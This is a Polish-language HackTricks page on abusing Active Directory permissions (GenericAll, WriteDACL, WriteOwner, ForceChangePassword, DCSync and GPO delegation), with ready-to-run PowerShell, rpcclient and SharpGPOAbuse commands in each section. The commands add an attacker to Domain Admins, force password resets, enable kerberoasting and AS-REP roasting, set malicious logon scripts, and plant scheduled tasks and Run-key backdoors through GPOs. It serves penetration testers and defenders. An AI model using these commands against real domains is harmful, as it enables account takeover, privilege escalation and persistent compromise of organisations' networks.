# Wykorzystywanie ACL/ACE w Active Directory

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Znajdź najważniejsze podatności, aby móc je szybko naprawić. Intruder śledzi powierzchnię ataku, wykonuje skanowanie zagrożeń, znajduje problemy w całym stosie technologicznym, od interfejsów API po aplikacje internetowe i systemy chmurowe. [**Wypróbuj go za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) już dziś.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**Ta strona jest głównie podsumowaniem technik z [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) i [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges). Aby uzyskać więcej szczegółów, sprawdź oryginalne artykuły.**


## **Prawa GenericAll dla użytkownika**
Ten przywilej daje atakującemu pełną kontrolę nad kontem docelowego użytkownika. Po potwierdzeniu praw `GenericAll` za pomocą polecenia `Get-ObjectAcl`, atakujący może:

- **Zmienić hasło docelowego użytkownika**: Za pomocą polecenia `net user <nazwa_użytkownika> <hasło> /domain`, atakujący może zresetować hasło użytkownika.
- **Kerberoasting ukierunkowany**: Przypisać SPN do konta użytkownika, aby można było go poddać kerberoastingowi, a następnie użyć narzędzi Rubeus i targetedKerberoast.py do wydobycia i próby złamania skrótu biletu uprawniającego do wydawania biletów (TGT).
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Celowane ASREPRoasting**: Wyłącz wstępną autoryzację dla użytkownika, czyniąc jego konto podatnym na ASREPRoasting.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Prawa GenericAll na grupie**
Ta uprzywilejowana rola umożliwia atakującemu manipulowanie przynależnościami do grupy, jeśli ma prawa `GenericAll` na grupie, takiej jak `Domain Admins`. Po zidentyfikowaniu nazwy odróżniającej grupy za pomocą polecenia `Get-NetGroup`, atakujący może:

- **Dodać siebie do grupy Domain Admins**: Można to zrobić za pomocą bezpośrednich poleceń lub korzystając z modułów takich jak Active Directory lub PowerSploit.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write na komputerze/Użytkowniku**
Posiadanie tych uprawnień na obiekcie komputera lub koncie użytkownika umożliwia:

- **Kerberos Resource-based Constrained Delegation**: Pozwala na przejęcie obiektu komputera.
- **Shadow Credentials**: Wykorzystując te uprawnienia, można podszywać się pod konto komputera lub użytkownika, tworząc cienie poświadczeń.

## **WriteProperty na Grupie**
Jeśli użytkownik ma prawa `WriteProperty` do wszystkich obiektów dla konkretnej grupy (np. `Domain Admins`), może:

- **Dodać siebie do grupy Domain Admins**: Można to osiągnąć poprzez połączenie poleceń `net user` i `Add-NetGroupUser`, co umożliwia eskalację uprawnień w domenie.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Członkostwo własne) w grupie**
Ta uprzywilejowana funkcja umożliwia atakującym dodanie siebie do określonych grup, takich jak `Domain Admins`, za pomocą poleceń manipulujących bezpośrednio członkostwem w grupie. Użycie następującej sekwencji poleceń pozwala na samododanie się:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Członkostwo w grupie)**
Podobne uprawnienie, które pozwala atakującym bezpośrednio dodać się do grup poprzez modyfikację właściwości grup, jeśli mają prawo `WriteProperty` do tych grup. Potwierdzenie i wykonanie tego uprawnienia odbywa się za pomocą:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**
Posiadanie `ExtendedRight` dla użytkownika `User-Force-Change-Password` umożliwia resetowanie hasła bez znajomości bieżącego hasła. Weryfikacja tego uprawnienia i jego wykorzystanie można przeprowadzić za pomocą PowerShell lub alternatywnych narzędzi wiersza poleceń, oferujących kilka metod resetowania hasła użytkownika, w tym sesje interaktywne i jednolinijkowe polecenia dla środowisk nieinteraktywnych. Komendy te obejmują proste wywołania PowerShell oraz korzystanie z `rpcclient` w systemie Linux, co demonstruje wszechstronność wektorów ataku.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **Zapisz właściciela grupy**
Jeśli atakujący odkryje, że ma uprawnienia `WriteOwner` do grupy, może zmienić właściciela grupy na siebie. Jest to szczególnie istotne, gdy grupą w pytaniu jest `Domain Admins`, ponieważ zmiana właściciela umożliwia szerszą kontrolę nad atrybutami grupy i jej członkostwem. Proces ten polega na zidentyfikowaniu odpowiedniego obiektu za pomocą polecenia `Get-ObjectAcl`, a następnie użyciu polecenia `Set-DomainObjectOwner` do modyfikacji właściciela, zarówno za pomocą SID, jak i nazwy.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite na użytkowniku**
To uprawnienie pozwala atakującemu na modyfikację właściwości użytkownika. Konkretnie, dzięki dostępowi `GenericWrite`, atakujący może zmienić ścieżkę skryptu logowania użytkownika, aby wykonać złośliwy skrypt podczas logowania użytkownika. Osiąga się to za pomocą polecenia `Set-ADObject`, które aktualizuje właściwość `scriptpath` docelowego użytkownika, wskazując na skrypt atakującego.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite w grupie**
Z tym uprawnieniem atakujący mogą manipulować przynależnością do grupy, taką jak dodawanie siebie lub innych użytkowników do określonych grup. Proces ten polega na tworzeniu obiektu poświadczeń, używaniu go do dodawania lub usuwania użytkowników z grupy oraz weryfikacji zmian przynależności za pomocą poleceń PowerShell.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**
Posiadanie obiektu AD i uprawnień `WriteDACL` umożliwia atakującemu przyznanie sobie uprawnień `GenericAll` dla tego obiektu. Jest to osiągane poprzez manipulację ADSI, co umożliwia pełną kontrolę nad obiektem i możliwość modyfikacji jego przynależności do grup. Pomimo tego istnieją pewne ograniczenia przy próbie wykorzystania tych uprawnień za pomocą poleceń `Set-Acl` / `Get-Acl` modułu Active Directory.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replikacja w domenie (DCSync)**
Atak DCSync wykorzystuje określone uprawnienia replikacji w domenie do naśladowania kontrolera domeny i synchronizacji danych, w tym poświadczeń użytkowników. Ta potężna technika wymaga uprawnień takich jak `DS-Replication-Get-Changes`, umożliwiających atakującym wydobycie poufnych informacji z środowiska AD bez bezpośredniego dostępu do kontrolera domeny.
[**Dowiedz się więcej o ataku DCSync tutaj.**](../dcsync.md)







## Delegacja GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delegacja GPO

Delegowane uprawnienia do zarządzania obiektami Group Policy Objects (GPO) mogą stanowić znaczne ryzyko dla bezpieczeństwa. Na przykład, jeśli użytkownik o nazwie `offense\spotless` otrzymał uprawnienia do zarządzania GPO, może posiadać uprawnienia takie jak **WriteProperty**, **WriteDacl** i **WriteOwner**. Te uprawnienia mogą być wykorzystane w celach złośliwych, co można zidentyfikować za pomocą narzędzia PowerView:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

### Wyliczanie uprawnień GPO

Aby zidentyfikować źle skonfigurowane GPO, można łączyć ze sobą polecenia cmdlet narzędzia PowerSploit. Pozwala to na odkrycie GPO, które dany użytkownik ma uprawnienia do zarządzania:
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

**Komputery, na których zastosowano daną politykę**: Można ustalić, na jakie komputery ma zastosowanie określone GPO, co pomaga zrozumieć zakres potencjalnego wpływu.
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```

**Zastosowane polityki dla danego komputera**: Aby zobaczyć, jakie polityki są zastosowane dla określonego komputera, można użyć poleceń takich jak `Get-DomainGPO`.

**OU z zastosowaną daną polityką**: Identyfikowanie jednostek organizacyjnych (OU), które są dotknięte daną polityką, można wykonać za pomocą polecenia `Get-DomainOU`.

### Nadużycie GPO - New-GPOImmediateTask

Źle skonfigurowane GPO mogą być wykorzystane do wykonania kodu, na przykład poprzez utworzenie natychmiastowego zaplanowanego zadania. Może to być zrobione w celu dodania użytkownika do grupy lokalnych administratorów na dotkniętych maszynach, znacznie podnosząc uprawnienia:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### Moduł GroupPolicy - Nadużycie GPO

Moduł GroupPolicy, jeśli zainstalowany, umożliwia tworzenie i łączenie nowych GPO oraz ustawianie preferencji, takich jak wartości rejestru, w celu uruchomienia backdoorów na dotkniętych komputerach. Metoda ta wymaga aktualizacji GPO oraz zalogowania się użytkownika na komputerze w celu wykonania:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Wykorzystywanie GPO

SharpGPOAbuse oferuje metodę wykorzystywania istniejących GPO poprzez dodawanie zadań lub modyfikowanie ustawień bez konieczności tworzenia nowych GPO. Narzędzie to wymaga modyfikacji istniejących GPO lub użycia narzędzi RSAT do tworzenia nowych przed zastosowaniem zmian:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Wymuszenie aktualizacji polityki

Aktualizacje GPO zazwyczaj występują co około 90 minut. Aby przyspieszyć ten proces, zwłaszcza po wprowadzeniu zmian, można użyć polecenia `gpupdate /force` na komputerze docelowym, aby wymusić natychmiastową aktualizację polityki. To polecenie zapewnia, że wszelkie modyfikacje GPO zostaną zastosowane bez oczekiwania na następny cykl automatycznej aktualizacji.

### Pod maską

Po zbadaniu Zaplanowanych zadań dla określonego GPO, takiego jak `Misconfigured Policy`, można potwierdzić dodanie zadań takich jak `evilTask`. Te zadania są tworzone za pomocą skryptów lub narzędzi wiersza poleceń, które mają na celu modyfikację zachowania systemu lub eskalację uprawnień.

Struktura zadania, jak pokazano w pliku konfiguracyjnym XML wygenerowanym przez `New-GPOImmediateTask`, przedstawia szczegóły zaplanowanego zadania - w tym polecenie do wykonania i jego wyzwalacze. Ten plik przedstawia, jak są definiowane i zarządzane zaplanowane zadania w ramach GPO, zapewniając metodę wykonania dowolnych poleceń lub skryptów w ramach egzekwowania polityki.

### Użytkownicy i grupy

GPO umożliwia również manipulację członkostwem użytkowników i grup na systemach docelowych. Poprzez bezpośrednią edycję plików polityki Użytkowników i Grup, atakujący mogą dodawać użytkowników do uprzywilejowanych grup, takich jak lokalna grupa `administrators`. Jest to możliwe dzięki delegowaniu uprawnień do zarządzania GPO, co umożliwia modyfikację plików polityki w celu dodania nowych użytkowników lub zmiany członkostwa w grupach.

Plik konfiguracyjny XML dla Użytkowników i Grup przedstawia, jak te zmiany są wdrażane. Dodając wpisy do tego pliku, określonym użytkownikom można przyznać podwyższone uprawnienia na dotkniętych systemach. Ta metoda oferuje bezpośrednie podejście do eskalacji uprawnień poprzez manipulację GPO.

Ponadto, można również rozważyć dodatkowe metody wykonania kodu lub utrzymania trwałości, takie jak wykorzystanie skryptów logowania/wylogowania, modyfikowanie kluczy rejestru dla autostartu, instalowanie oprogramowania za pomocą plików .msi lub edycja konfiguracji usług. Te techniki zapewniają różne możliwości utrzymania dostępu i kontrolowania systemów docelowych poprzez nadużycie GPO.

## Odwołania

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Znajduj luki, które mają największe znaczenie, abyś mógł je szybciej naprawić. Intruder śledzi twoją powierzchnię ataku, wykonuje proaktywne skanowanie zagrożeń, znajduje problemy we wszystkich technologiach, od interfejsów API po aplikacje internetowe i systemy chmurowe. [**Wypróbuj go za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) już dziś.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć **reklamę swojej firmy w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
